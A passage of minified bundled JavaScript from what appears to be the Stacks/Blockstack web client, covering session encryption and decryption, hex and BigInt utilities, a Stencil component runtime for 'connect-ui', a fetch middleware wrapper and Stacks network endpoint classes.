                  s = await Kt(n.publicKey, o, i, n.cipherTextEncoding);
                let a = JSON.stringify(s);
                if (n.sign) {
                  "string" === typeof n.sign
                    ? (r = n.sign)
                    : r || (r = n.privateKey);
                  const e = Vt(r, a),
                    t = {
                      signature: e.signature,
                      publicKey: e.publicKey,
                      cipherText: a,
                    };
                  a = JSON.stringify(t);
                }
                return a;
              })(e, n)
            );
          }
          decryptContent(e, t) {
            const n = Object.assign({}, t);
            return (
              n.privateKey ||
                (n.privateKey = this.loadUserData().appPrivateKey),
              (function (e, t) {
                const n = Object.assign({}, t);
                if (!n.privateKey)
                  throw new Error("Private key is required for decryption.");
                try {
                  const t = JSON.parse(e);
                  return Wt(n.privateKey, t);
                } catch (r) {
                  throw r instanceof SyntaxError
                    ? new Error(
                        "Failed to parse encrypted content JSON. The content may not be encrypted. If using getFile, try passing { decrypt: false }."
                      )
                    : r;
                }
              })(e, n)
            );
          }
          signUserOut(e) {
            this.store.deleteSessionData(),
              e &&
                "undefined" !== typeof location &&
                location.href &&
                (location.href = e);
          }
        }
        sn.prototype.makeAuthRequest = sn.prototype.makeAuthRequestToken;
      },
      8261: (e, t, n) => {
        "use strict";
        var r, i;
        n.d(t, { Kn: () => i, oK: () => r, sM: () => s, yo: () => o }),
          (function (e) {
            (e[(e.Testnet = 2147483648)] = "Testnet"),
              (e[(e.Mainnet = 1)] = "Mainnet");
          })(r || (r = {})),
          (function (e) {
            (e[(e.Mainnet = 0)] = "Mainnet"),
              (e[(e.Testnet = 128)] = "Testnet");
          })(i || (i = {}));
        const o = 33,
          s = "https://hub.blockstack.org";
      },
      2755: (e, t, n) => {
        "use strict";
        n.d(t, { z: () => i });
        var r = n(9083);
        function i(e) {
          const t = "string" === typeof e ? (0, r.nr)(e) : e;
          if (32 != t.length && 33 != t.length)
            throw new Error(
              `Improperly formatted private-key. Private-key byte length should be 32 or 33. Length provided: ${t.length}`
            );
          if (33 == t.length && 1 !== t[32])
            throw new Error(
              "Improperly formatted private-key. 33 bytes indicate compressed key, but the last byte must be == 01"
            );
          return t;
        }
      },
      6435: (e, t, n) => {
        "use strict";
        n.d(t, { Y: () => a });
        const r = "debug",
          i = ["debug", "info", "warn", "error", "none"],
          o = {},
          s = {};
        for (let l = 0; l < i.length; l++) {
          const e = i[l];
          (o[e] = l), (s[l] = e);
        }
        class a {
          static error(e) {
            this.shouldLog("error") &&
              console.error(this.logMessage("error", e));
          }
          static warn(e) {
            this.shouldLog("warn") && console.warn(this.logMessage("warn", e));
          }
          static info(e) {
            this.shouldLog("info") && console.log(this.logMessage("info", e));
          }
          static debug(e) {
            this.shouldLog("debug") && console.log(this.logMessage("debug", e));
          }
          static logMessage(e, t) {
            return `[${e.toUpperCase()}] ${t}`;
          }
          static shouldLog(e) {
            return o[r] <= o[e];
          }
        }
      },
      9083: (e, t, n) => {
        "use strict";
        n.d(t, {
          $j: () => w,
          HN: () => h,
          I4: () => p,
          Md: () => S,
          QD: () => x,
          Qs: () => A,
          Rf: () => u,
          WR: () => g,
          WW: () => I,
          cG: () => o,
          ci: () => b,
          eV: () => C,
          gS: () => a,
          iY: () => E,
          jk: () => y,
          nD: () => i,
          nr: () => v,
          sO: () => f,
          se: () => s,
          y_: () => d,
        });
        var r = n(6435);
        function i() {
          return new Date(new Date().setMonth(new Date().getMonth() + 1));
        }
        function o() {
          return new Date(new Date().setHours(new Date().getHours() + 1));
        }
        function s(e, t) {
          (void 0 !== e && "" !== e) || (e = "0.0.0"),
            (void 0 !== t && "" !== e) || (t = "0.0.0");
          const n = e.split(".").map((e) => parseInt(e, 10)),
            r = t.split(".").map((e) => parseInt(e, 10));
          for (let i = 0; i < t.length; i++)
            if ((i >= e.length && r.push(0), n[i] < r[i])) return !1;
          return !0;
        }
        function a() {
          let e = new Date().getTime();
          return (
            "undefined" !== typeof performance &&
              "function" === typeof performance.now &&
              (e += performance.now()),
            "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (t) => {
              const n = (e + 16 * Math.random()) % 16 | 0;
              return (
                (e = Math.floor(e / 16)),
                ("x" === t ? n : (3 & n) | 8).toString(16)
              );
            })
          );
        }
        function l() {
          if ("undefined" !== typeof self) return self;
          if ("undefined" !== typeof window) return window;
          if ("undefined" !== typeof n.g) return n.g;
          throw new Error(
            "Unexpected runtime environment - no supported global scope (`window`, `self`, `global`) available"
          );
        }
        function c(e, t, n) {
          return n
            ? `Use of '${n}' requires \`${t}\` which is unavailable on the '${e}' object within the currently executing environment.`
            : `\`${t}\` is unavailable on the '${e}' object within the currently executing environment.`;
        }
        function u(e) {
          let t,
            {
              throwIfUnavailable: n,
              usageDesc: i,
              returnEmptyObject: o,
            } = arguments.length > 1 && void 0 !== arguments[1]
              ? arguments[1]
              : {};
          try {
            if (((t = l()), t)) {
              const n = t[e];
              if (n) return n;
            }
          } catch (s) {
            r.Y.error(
              `Error getting object '${e}' from global scope '${t}': ${s}`
            );
          }
          if (n) {
            const n = c(t, e.toString(), i);
            throw (r.Y.error(n), new Error(n));
          }
          if (o) return {};
        }
        function f(e, t, n) {
          return y(h(e, t), n);
        }
        function h(e, t) {
          let n = e;
          if ("number" === typeof n) {
            if (!Number.isInteger(n))
              throw new RangeError(
                "Invalid value. Values of type 'number' must be an integer."
              );
            return BigInt(n);
          }
          if ("string" === typeof n)
            if (n.toLowerCase().startsWith("0x")) {
              let e = n.slice(2);
              (e = e.padStart(e.length + (e.length % 2), "0")), (n = v(e));
            } else
              try {
                return BigInt(n);
              } catch (r) {
                if (r instanceof SyntaxError)
                  throw new RangeError(
                    `Invalid value. String integer '${n}' is not finite.`
                  );
              }
          if ("bigint" === typeof n) return n;
          if (n instanceof Uint8Array) {
            if (t) {
              const e = (function (e, t) {
                if (
                  (function (e, t) {
                    return e & (BigInt(1) << t);
                  })(e, t - BigInt(1))
                )
                  return e - (BigInt(1) << t);
                return e;
              })(BigInt(`0x${b(n)}`), BigInt(8 * n.byteLength));
              return BigInt(e.toString());
            }
            return BigInt(`0x${b(n)}`);
          }
          if (null != n && "object" === typeof n && "BN" === n.constructor.name)
            return BigInt(n.toString());
          throw new TypeError(
            "Invalid value type. Must be a number, bigint, integer-string, hex-string, or Uint8Array."
          );
        }
        function d(e) {
          if ("string" !== typeof e)
            throw new TypeError(
              "hexToBigInt: expected string, got " + typeof e
            );
          return BigInt(`0x${e}`);
        }
        function p(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 8;
          return ("bigint" === typeof e ? e : h(e, !1))
            .toString(16)
            .padStart(2 * t, "0");
        }
        function g(e) {
          return parseInt(e, 16);
        }
        function y(e) {
          return v(
            p(
              e,
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : 16
            )
          );
        }
        function w(e, t) {
          if (
            e < -(BigInt(1) << (t - BigInt(1))) ||
            (BigInt(1) << (t - BigInt(1))) - BigInt(1) < e
          )
            throw `Unable to represent integer in width: ${t}`;
          return e >= BigInt(0) ? BigInt(e) : e + (BigInt(1) << t);
        }
        const m = Array.from({ length: 256 }, (e, t) =>
          t.toString(16).padStart(2, "0")
        );
        function b(e) {
          if (!(e instanceof Uint8Array))
            throw new Error("Uint8Array expected");
          let t = "";
          for (const n of e) t += m[n];
          return t;
        }
        function v(e) {
          if ("string" !== typeof e)
            throw new TypeError("hexToBytes: expected string, got " + typeof e);
          const t = e.length % 2 ? `0${e}` : e,
            n = new Uint8Array(t.length / 2);
          for (let r = 0; r < n.length; r++) {
            const e = 2 * r,
              i = t.slice(e, e + 2),
              o = Number.parseInt(i, 16);
            if (Number.isNaN(o) || o < 0)
              throw new Error("Invalid byte sequence");
            n[r] = o;
          }
          return n;
        }
        function E(e) {
          return new TextEncoder().encode(e);
        }
        function S(e) {
          return new TextDecoder().decode(e);
        }
        function x(e) {
          const t = [];
          for (let n = 0; n < e.length; n++) t.push(255 & e.charCodeAt(n));
          return new Uint8Array(t);
        }
        function A(e) {
          return String.fromCharCode.apply(null, e);
        }
        function k(e) {
          return !Number.isInteger(e) || e < 0 || e > 255;
        }
        function T(e) {
          if (e.some(k)) throw new Error("Some values are invalid bytes.");
          return new Uint8Array(e);
        }
        function C() {
          for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
            t[n] = arguments[n];
          if (!t.every((e) => e instanceof Uint8Array))
            throw new Error("Uint8Array list expected");
          if (1 === t.length) return t[0];
          const r = t.reduce((e, t) => e + t.length, 0),
            i = new Uint8Array(r);
          for (let o = 0, s = 0; o < t.length; o++) {
            const e = t[o];
            i.set(e, s), (s += e.length);
          }
          return i;
        }
        function I(e) {
          return C(
            ...e.map((e) =>
              "number" === typeof e ? T([e]) : e instanceof Array ? T(e) : e
            )
          );
        }
      },
      3137: (e, t, n) => {
        "use strict";
        n.d(t, { b: () => H, g: () => h, h: () => c, p: () => J, r: () => F });
        let r,
          i,
          o = !1;
        const s = {},
          a = (e) => "object" === (e = typeof e) || "function" === e;
        function l(e) {
          var t, n, r;
          return null !==
            (r =
              null ===
                (n =
                  null === (t = e.head) || void 0 === t
                    ? void 0
                    : t.querySelector('meta[name="csp-nonce"]')) || void 0 === n
                ? void 0
                : n.getAttribute("content")) && void 0 !== r
            ? r
            : void 0;
        }
        const c = function (e, t) {
            let n = null,
              r = !1,
              i = !1;
            const o = [],
              s = (t) => {
                for (let l = 0; l < t.length; l++)
                  (n = t[l]),
                    Array.isArray(n)
                      ? s(n)
                      : null != n &&
                        "boolean" !== typeof n &&
                        ((r = "function" !== typeof e && !a(n)) &&
                          (n = String(n)),
                        r && i
                          ? (o[o.length - 1].$text$ += n)
                          : o.push(r ? u(null, n) : n),
                        (i = r));
              };
            for (
              var l = arguments.length, c = new Array(l > 2 ? l - 2 : 0), f = 2;
              f < l;
              f++
            )
              c[f - 2] = arguments[f];
            if ((s(c), t)) {
              const e = t.className || t.class;
              e &&
                (t.class =
                  "object" !== typeof e
                    ? e
                    : Object.keys(e)
                        .filter((t) => e[t])
                        .join(" "));
            }
            const h = u(e, null);
            return (h.$attrs$ = t), o.length > 0 && (h.$children$ = o), h;
          },
          u = (e, t) => {
            const n = {
              $flags$: 0,
              $tag$: e,
              $text$: t,
              $elm$: null,
              $children$: null,
              $attrs$: null,
            };
            return n;
          },
          f = {},
          h = (e) => M(e).$hostElement$,
          d = new WeakMap(),
          p = (e) => {
            const t = e.$cmpMeta$,
              n = e.$hostElement$,
              r = t.$flags$,
              i = (t.$tagName$, () => {}),
              o = ((e, t, n, r) => {
                var i;
                let o = g(t);
                const s = q.get(o);
                if (((e = 11 === e.nodeType ? e : Y), s))
                  if ("string" === typeof s) {
                    e = e.head || e;
                    let t,
                      n = d.get(e);
                    if ((n || d.set(e, (n = new Set())), !n.has(o))) {
                      {
                        (t = Y.createElement("style")), (t.innerHTML = s);
                        const n =
                          null !== (i = Z.$nonce$) && void 0 !== i ? i : l(Y);
                        null != n && t.setAttribute("nonce", n),
                          e.insertBefore(t, e.querySelector("link"));
                      }
                      n && n.add(o);
                    }
                  } else
                    e.adoptedStyleSheets.includes(s) ||
                      (e.adoptedStyleSheets = [...e.adoptedStyleSheets, s]);
                return o;
              })(n.shadowRoot ? n.shadowRoot : n.getRootNode(), t);
            10 & r && ((n["s-sc"] = o), n.classList.add(o + "-h")), i();
          },
          g = (e, t) => "sc-" + e.$tagName$,
          y = (e, t, n, r, i, o) => {
            if (n !== r) {
              let l = z(e, t),
                c = t.toLowerCase();
              if ("class" === t) {
                const t = e.classList,
                  i = m(n),
                  o = m(r);
                t.remove(...i.filter((e) => e && !o.includes(e))),
                  t.add(...o.filter((e) => e && !i.includes(e)));
              } else if (l || "o" !== t[0] || "n" !== t[1]) {
                const c = a(r);
                if ((l || (c && null !== r)) && !i)
                  try {
                    if (e.tagName.includes("-")) e[t] = r;
                    else {
                      const i = null == r ? "" : r;
                      "list" === t
                        ? (l = !1)
                        : (null != n && e[t] == i) || (e[t] = i);
                    }
                  } catch (s) {}
                null == r || !1 === r
                  ? (!1 === r && "" !== e.getAttribute(t)) ||
                    e.removeAttribute(t)
                  : (!l || 4 & o || i) &&
                    !c &&
                    ((r = !0 === r ? "" : r), e.setAttribute(t, r));
              } else
                (t =
                  "-" === t[2]
                    ? t.slice(3)
                    : z(G, c)
                    ? c.slice(2)
                    : c[2] + t.slice(3)),
                  n && Z.rel(e, t, n, !1),
                  r && Z.ael(e, t, r, !1);
            }
          },
          w = /\s/,
          m = (e) => (e ? e.split(w) : []),
          b = (e, t, n, r) => {
            const i =
                11 === t.$elm$.nodeType && t.$elm$.host
                  ? t.$elm$.host
                  : t.$elm$,
              o = (e && e.$attrs$) || s,
              a = t.$attrs$ || s;
            for (r in o) r in a || y(i, r, o[r], void 0, n, t.$flags$);
            for (r in a) y(i, r, o[r], a[r], n, t.$flags$);
          },
          v = (e, t, n, i) => {
            const o = t.$children$[n];
            let s,
              a,
              l = 0;
            if (null !== o.$text$) s = o.$elm$ = Y.createTextNode(o.$text$);
            else if (
              ((s = o.$elm$ = Y.createElement(o.$tag$)),
              b(null, o, false),
              null != r && s["s-si"] !== r && s.classList.add((s["s-si"] = r)),
              o.$children$)
            )
              for (l = 0; l < o.$children$.length; ++l)
                (a = v(e, o, l)), a && s.appendChild(a);
            return s;
          },
          E = (e, t, n, r, o, s) => {
            let a,
              l = e;
            for (
              l.shadowRoot && l.tagName === i && (l = l.shadowRoot);
              o <= s;
              ++o
            )
              r[o] &&
                ((a = v(null, n, o)),
                a && ((r[o].$elm$ = a), l.insertBefore(a, t)));
          },
          S = (e, t, n, r, i) => {
            for (; t <= n; ++t) (r = e[t]) && r.$elm$.remove();
          },
          x = (e, t) => e.$tag$ === t.$tag$,
          A = (e, t) => {
            const n = (t.$elm$ = e.$elm$),
              r = e.$children$,
              i = t.$children$,
              o = t.$text$;
            null === o
              ? (b(e, t, false),
                null !== r && null !== i
                  ? ((e, t, n, r) => {
                      let i,
                        o = 0,
                        s = 0,
                        a = t.length - 1,
                        l = t[0],
                        c = t[a],
                        u = r.length - 1,
                        f = r[0],
                        h = r[u];
                      for (; o <= a && s <= u; )
                        null == l
                          ? (l = t[++o])
                          : null == c
                          ? (c = t[--a])
                          : null == f
                          ? (f = r[++s])
                          : null == h
                          ? (h = r[--u])
                          : x(l, f)
                          ? (A(l, f), (l = t[++o]), (f = r[++s]))
                          : x(c, h)
                          ? (A(c, h), (c = t[--a]), (h = r[--u]))
                          : x(l, h)
                          ? (A(l, h),
                            e.insertBefore(l.$elm$, c.$elm$.nextSibling),
                            (l = t[++o]),
                            (h = r[--u]))
                          : x(c, f)
                          ? (A(c, f),
                            e.insertBefore(c.$elm$, l.$elm$),
                            (c = t[--a]),
                            (f = r[++s]))
                          : ((i = v(t && t[s], n, s)),
                            (f = r[++s]),
                            i && l.$elm$.parentNode.insertBefore(i, l.$elm$));
                      o > a
                        ? E(
                            e,
                            null == r[u + 1] ? null : r[u + 1].$elm$,
                            n,
                            r,
                            s,
                            u
                          )
                        : s > u && S(t, o, a);
                    })(n, r, t, i)
                  : null !== i
                  ? (null !== e.$text$ && (n.textContent = ""),
                    E(n, null, t, i, 0, i.length - 1))
                  : null !== r && S(r, 0, r.length - 1))
              : e.$text$ !== o && (n.data = o);
          },
          k = (e, t) => {
            const n = e.$hostElement$,
              o = e.$vnode$ || u(null, null),
              s = (a = t) && a.$tag$ === f ? t : c(null, null, t);
            var a;
            (i = n.tagName),
              (s.$tag$ = null),
              (s.$flags$ |= 4),
              (e.$vnode$ = s),
              (s.$elm$ = o.$elm$ = n.shadowRoot || n),
              (r = n["s-sc"]),
              A(o, s);
          },
          T = (e, t) => {
            t &&
              !e.$onRenderResolve$ &&
              t["s-p"] &&
              t["s-p"].push(new Promise((t) => (e.$onRenderResolve$ = t)));
          },
          C = (e, t) => {
            if (((e.$flags$ |= 16), 4 & e.$flags$))
              return void (e.$flags$ |= 512);
            T(e, e.$ancestorComponent$);
            return oe(() => I(e, t));
          },
          I = (e, t) => {
            const n = (e.$cmpMeta$.$tagName$, () => {}),
              r = e.$lazyInstance$;
            return n(), U(undefined, () => O(e, r, t));
          },
          O = async (e, t, n) => {
            const r = e.$hostElement$,
              i = (e.$cmpMeta$.$tagName$, () => {}),
              o = r["s-rc"];
            n && p(e);
            const s = (e.$cmpMeta$.$tagName$, () => {});
            B(e, t), o && (o.map((e) => e()), (r["s-rc"] = void 0)), s(), i();
            {
              const t = r["s-p"],
                n = () => P(e);
              0 === t.length
                ? n()
                : (Promise.all(t).then(n), (e.$flags$ |= 4), (t.length = 0));
            }
          },
          B = (e, t, n) => {
            try {
              (t = t.render()), (e.$flags$ &= -17), (e.$flags$ |= 2), k(e, t);
            } catch (r) {
              K(r, e.$hostElement$);
            }
            return null;
          },
          P = (e) => {
            e.$cmpMeta$.$tagName$;
            const t = e.$hostElement$,
              n = () => {},
              r = e.$ancestorComponent$;
            64 & e.$flags$
              ? n()
              : ((e.$flags$ |= 64), N(t), n(), e.$onReadyResolve$(t), r || _()),
              e.$onRenderResolve$ &&
                (e.$onRenderResolve$(), (e.$onRenderResolve$ = void 0)),
              512 & e.$flags$ && ie(() => C(e, !1)),
              (e.$flags$ &= -517);
          },
          _ = (e) => {
            N(Y.documentElement),
              ie(() =>
                ((e, t, n) => {
                  const r = Z.ce(t, n);
                  return e.dispatchEvent(r), r;
                })(G, "appload", { detail: { namespace: "connect-ui" } })
              );
          },
          U = (e, t) => (e && e.then ? e.then(t) : t()),
          N = (e) => e.classList.add("hydrated"),
          R = (e, t, n, r) => {
            const i = M(e),
              o = i.$instanceValues$.get(t),
              s = i.$flags$,
              l = i.$lazyInstance$;
            var c;
            null == (c = n) || a(c), (n = c);
            const u = Number.isNaN(o) && Number.isNaN(n);
            (8 & s && void 0 !== o) ||
              !(n !== o && !u) ||
              (i.$instanceValues$.set(t, n), l && 2 === (18 & s) && C(i, !1));
          },
          L = (e, t, n) => {
            if (t.$members$) {
              const r = Object.entries(t.$members$),
                i = e.prototype;
              r.map((e) => {
                let [t, [r]] = e;
                (31 & r || (2 & n && 32 & r)) &&
                  Object.defineProperty(i, t, {
                    get() {
                      return (e = t), M(this).$instanceValues$.get(e);
                      var e;
                    },
                    set(e) {
                      R(this, t, e);
                    },
                    configurable: !0,
                    enumerable: !0,
                  });
              });
            }
            return e;
          },
          $ = async (e, t, n, r, i) => {
            if (0 === (32 & t.$flags$)) {
              {
                if (((t.$flags$ |= 32), (i = V(n)).then)) {
                  const e = () => {};
                  (i = await i), e();
                }
                i.isProxied || (L(i, n, 2), (i.isProxied = !0));
                const e = (n.$tagName$, () => {});
                t.$flags$ |= 8;
                try {
                  new i(t);
                } catch (a) {
                  K(a);
                }
                (t.$flags$ &= -9), e();
              }
              if (i.style) {
                let e = i.style;
                const t = g(n);
                if (!q.has(t)) {
                  const r = (n.$tagName$, () => {});
                  ((e, t, n) => {
                    let r = q.get(e);
                    X && n
                      ? ((r = r || new CSSStyleSheet()),
                        "string" === typeof r ? (r = t) : r.replaceSync(t))
                      : (r = t),
                      q.set(e, r);
                  })(t, e, !!(1 & n.$flags$)),
                    r();
                }
              }
            }
            const o = t.$ancestorComponent$,
              s = () => C(t, !0);
            o && o["s-rc"] ? o["s-rc"].push(s) : s();
          },
          H = function (e) {
            let t =
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : {};
            var n;
            const r = () => {},
              i = [],
              o = t.exclude || [],
              s = G.customElements,
              a = Y.head,
              c = a.querySelector("meta[charset]"),
              u = Y.createElement("style"),
              f = [];
            let h,
              d = !0;
            Object.assign(Z, t),
              (Z.$resourcesUrl$ = new URL(
                t.resourcesUrl || "./",
                Y.baseURI
              ).href),
              e.map((e) => {
                e[1].map((t) => {
                  const n = {
                    $flags$: t[0],
                    $tagName$: t[1],
                    $members$: t[2],
                    $listeners$: t[3],
                  };
                  n.$members$ = t[2];
                  const r = n.$tagName$,
                    a = class extends HTMLElement {
                      constructor(e) {
                        super(e),
                          j((e = this), n),
                          1 & n.$flags$ && e.attachShadow({ mode: "open" });
                      }
                      connectedCallback() {
                        h && (clearTimeout(h), (h = null)),
                          d
                            ? f.push(this)
                            : Z.jmp(() =>
                                ((e) => {
                                  if (0 === (1 & Z.$flags$)) {
                                    const t = M(e),
                                      n = t.$cmpMeta$,
                                      r = (n.$tagName$, () => {});
                                    if (!(1 & t.$flags$)) {
                                      t.$flags$ |= 1;
                                      {
                                        let n = e;
                                        for (; (n = n.parentNode || n.host); )
                                          if (n["s-p"]) {
                                            T(t, (t.$ancestorComponent$ = n));
                                            break;
                                          }
                                      }
                                      n.$members$ &&
                                        Object.entries(n.$members$).map((t) => {
                                          let [n, [r]] = t;
                                          if (31 & r && e.hasOwnProperty(n)) {
                                            const t = e[n];
                                            delete e[n], (e[n] = t);
                                          }
                                        }),
                                        $(0, t, n);
                                    }
                                    r();
                                  }
                                })(this)
                              );
                      }
                      disconnectedCallback() {
                        Z.jmp(() => {
                          return (
                            (e = this), void (0 === (1 & Z.$flags$) && M(e))
                          );
                          var e;
                        });
                      }
                      componentOnReady() {
                        return M(this).$onReadyPromise$;
                      }
                    };
                  (n.$lazyBundleId$ = e[0]),
                    o.includes(r) ||
                      s.get(r) ||
                      (i.push(r), s.define(r, L(a, n, 1)));
                });
              });
            {
              (u.innerHTML =
                i + "{visibility:hidden}.hydrated{visibility:inherit}"),
                u.setAttribute("data-styles", "");
              const e = null !== (n = Z.$nonce$) && void 0 !== n ? n : l(Y);
              null != e && u.setAttribute("nonce", e),
                a.insertBefore(u, c ? c.nextSibling : a.firstChild);
            }
            (d = !1),
              f.length
                ? f.map((e) => e.connectedCallback())
                : Z.jmp(() => (h = setTimeout(_, 30))),
              r();
          },
          D = new WeakMap(),
          M = (e) => D.get(e),
          F = (e, t) => D.set((t.$lazyInstance$ = e), t),
          j = (e, t) => {
            const n = {
              $flags$: 0,
              $hostElement$: e,
              $cmpMeta$: t,
              $instanceValues$: new Map(),
            };
            return (
              (n.$onReadyPromise$ = new Promise(
                (e) => (n.$onReadyResolve$ = e)
              )),
              (e["s-p"] = []),
              (e["s-rc"] = []),
              D.set(e, n)
            );
          },
          z = (e, t) => t in e,
          K = (e, t) => (0, console.error)(e, t),
          W = new Map(),
          V = (e, t, r) => {
            const i = e.$tagName$.replace(/-/g, "_"),
              o = e.$lazyBundleId$,
              s = W.get(o);
            if (s) return s[i];
            if (!r || !BUILD.hotModuleReplacement) {
              const e = (e) => (W.set(o, e), e[i]);
              if ("connect-modal" === o)
                return n.e(730).then(n.bind(n, 8730)).then(e, K);
            }
            return n(3993)(`./${o}.entry.js`).then(
              (e) => (W.set(o, e), e[i]),
              K
            );
          },
          q = new Map(),
          G = "undefined" !== typeof window ? window : {},
          Y = G.document || { head: {} },
          Z = {
            $flags$: 0,
            $resourcesUrl$: "",
            jmp: (e) => e(),
            raf: (e) => requestAnimationFrame(e),
            ael: (e, t, n, r) => e.addEventListener(t, n, r),
            rel: (e, t, n, r) => e.removeEventListener(t, n, r),
            ce: (e, t) => new CustomEvent(e, t),
          },
          J = (e) => Promise.resolve(e),
          X = (() => {
            try {
              return (
                new CSSStyleSheet(),
                "function" === typeof new CSSStyleSheet().replaceSync
              );
            } catch (e) {}
            return !1;
          })(),
          Q = [],
          ee = [],
          te = (e, t) => (n) => {
            e.push(n), o || ((o = !0), t && 4 & Z.$flags$ ? ie(re) : Z.raf(re));
          },
          ne = (e) => {
            for (let n = 0; n < e.length; n++)
              try {
                e[n](performance.now());
              } catch (t) {
                K(t);
              }
            e.length = 0;
          },
          re = () => {
            ne(Q), ne(ee), (o = Q.length > 0) && Z.raf(re);
          },
          ie = (e) => J().then(e),
          oe = te(ee, !0);
      },
      4135: (e, t, n) => {
        "use strict";
        n.d(t, { eA: () => o });
        n(8916);
        const r = { referrerPolicy: "origin" };
        async function i(e, t) {
          const n = {};
          Object.assign(n, t, r);
          return await fetch(e, n);
        }
        function o() {
          for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
            t[n] = arguments[n];
          const { fetchLib: r, middlewares: o } = (function (e) {
            let t = i,
              n = [];
            return (
              e.length > 0 && "function" === typeof e[0] && (t = e.shift()),
              e.length > 0 && (n = e),
              { fetchLib: t, middlewares: n }
            );
          })(t);
          return async (e, t) => {
            let n = { url: e, init: null !== t && void 0 !== t ? t : {} };
            for (const l of o)
              if ("function" === typeof l.pre) {
                const e = await Promise.resolve(l.pre({ fetch: r, ...n }));
                n = null !== e && void 0 !== e ? e : n;
              }
            let i = await r(n.url, n.init);
            for (const l of o)
              if ("function" === typeof l.post) {
                var s, a;
                const e = await Promise.resolve(
                  l.post({
                    fetch: r,
                    url: n.url,
                    init: n.init,
                    response:
                      null !==
                        (s =
                          null === (a = i) || void 0 === a
                            ? void 0
                            : a.clone()) && void 0 !== s
                        ? s
                        : i,
                  })
                );
                i = null !== e && void 0 !== e ? e : i;
              }
            return i;
          };
        }
      },
      9926: (e, t, n) => {
        "use strict";
        n.d(t, { _Y: () => a, an: () => l });
        var r = n(8261),
          i = n(4135);
        const o = ["mainnet", "testnet", "devnet", "mocknet"];
        class s {
          constructor(e) {
            var t;
            (this.version = r.Kn.Mainnet),
              (this.chainId = r.oK.Mainnet),
              (this.bnsLookupUrl = "https://stacks-node-api.mainnet.stacks.co"),
              (this.broadcastEndpoint = "/v2/transactions"),
              (this.transferFeeEstimateEndpoint = "/v2/fees/transfer"),
              (this.transactionFeeEstimateEndpoint = "/v2/fees/transaction"),
              (this.accountEndpoint = "/v2/accounts"),
              (this.contractAbiEndpoint = "/v2/contracts/interface"),
              (this.readOnlyFunctionCallEndpoint = "/v2/contracts/call-read"),
              (this.isMainnet = () => this.version === r.Kn.Mainnet),
              (this.getBroadcastApiUrl = () =>
                `${this.coreApiUrl}${this.broadcastEndpoint}`),
              (this.getTransferFeeEstimateApiUrl = () =>
                `${this.coreApiUrl}${this.transferFeeEstimateEndpoint}`),
              (this.getTransactionFeeEstimateApiUrl = () =>
                `${this.coreApiUrl}${this.transactionFeeEstimateEndpoint}`),
              (this.getAccountApiUrl = (e) =>
                `${this.coreApiUrl}${this.accountEndpoint}/${e}?proof=0`),
              (this.getAccountExtendedBalancesApiUrl = (e) =>
                `${this.coreApiUrl}/extended/v1/address/${e}/balances`),
              (this.getAbiApiUrl = (e, t) =>
                `${this.coreApiUrl}${this.contractAbiEndpoint}/${e}/${t}`),
              (this.getReadOnlyFunctionCallApiUrl = (e, t, n) =>
                `${this.coreApiUrl}${
                  this.readOnlyFunctionCallEndpoint
                }/${e}/${t}/${encodeURIComponent(n)}`),
              (this.getInfoUrl = () => `${this.coreApiUrl}/v2/info`),
              (this.getBlockTimeInfoUrl = () =>
                `${this.coreApiUrl}/extended/v1/info/network_block_times`),
              (this.getPoxInfoUrl = () => `${this.coreApiUrl}/v2/pox`),
              (this.getRewardsUrl = (e, t) => {
                let n = `${this.coreApiUrl}/extended/v1/burnchain/rewards/${e}`;
                return t && (n = `${n}?limit=${t.limit}&offset=${t.offset}`), n;
              }),
              (this.getRewardsTotalUrl = (e) =>
                `${this.coreApiUrl}/extended/v1/burnchain/rewards/${e}/total`),
              (this.getRewardHoldersUrl = (e, t) => {
                let n = `${this.coreApiUrl}/extended/v1/burnchain/reward_slot_holders/${e}`;
                return t && (n = `${n}?limit=${t.limit}&offset=${t.offset}`), n;
              }),
              (this.getStackerInfoUrl = (e, t) =>
                `${this.coreApiUrl}${this.readOnlyFunctionCallEndpoint}\n    ${e}/${t}/get-stacker-info`),
              (this.getDataVarUrl = (e, t, n) =>
                `${this.coreApiUrl}/v2/data_var/${e}/${t}/${n}?proof=0`),
              (this.getMapEntryUrl = (e, t, n) =>
                `${this.coreApiUrl}/v2/map_entry/${e}/${t}/${n}?proof=0`),
              (this.coreApiUrl = e.url),
              (this.fetchFn =
                null !== (t = e.fetchFn) && void 0 !== t ? t : (0, i.eA)());
          }
          getNameInfo(e) {
            const t = `${this.bnsLookupUrl}/v1/names/${e}`;
            return this.fetchFn(t)
              .then((e) => {
                if (404 === e.status) throw new Error("Name not found");
                if (200 !== e.status)
                  throw new Error(`Bad response status: ${e.status}`);
                return e.json();
              })
              .then((e) =>
                e.address ? Object.assign({}, e, { address: e.address }) : e
              );
          }
        }
        (s.fromName = (e) => {
          switch (e) {
            case "mainnet":
              return new a();
            case "testnet":
              return new l();
            case "devnet":
              return new u();
            case "mocknet":
              return new c();
            default:
              throw new Error(
                `Invalid network name provided. Must be one of the following: ${o.join(
                  ", "
                )}`
              );
          }
        }),
          (s.fromNameOrNetwork = (e) =>
            "string" !== typeof e && "version" in e ? e : s.fromName(e));
        class a extends s {
          constructor(e) {
            var t;
            super({
              url:
                null !== (t = null === e || void 0 === e ? void 0 : e.url) &&
                void 0 !== t
                  ? t
                  : "https://stacks-node-api.mainnet.stacks.co",
              fetchFn: null === e || void 0 === e ? void 0 : e.fetchFn,
            }),
              (this.version = r.Kn.Mainnet),
              (this.chainId = r.oK.Mainnet);
          }
        }
        class l extends s {
          constructor(e) {
            var t;
            super({
              url:
                null !== (t = null === e || void 0 === e ? void 0 : e.url) &&
                void 0 !== t
                  ? t
                  : "https://stacks-node-api.testnet.stacks.co",
              fetchFn: null === e || void 0 === e ? void 0 : e.fetchFn,
            }),
              (this.version = r.Kn.Testnet),
              (this.chainId = r.oK.Testnet);
          }
        }
        class c extends s {
          constructor(e) {
            var t;
            super({
              url:
                null !== (t = null === e || void 0 === e ? void 0 : e.url) &&
                void 0 !== t
                  ? t
                  : "http://localhost:3999",
              fetchFn: null === e || void 0 === e ? void 0 : e.fetchFn,
            }),
              (this.version = r.Kn.Testnet),
              (this.chainId = r.oK.Testnet);
          }
        }
        const u = c;
      },
      7354: (e, t, n) => {
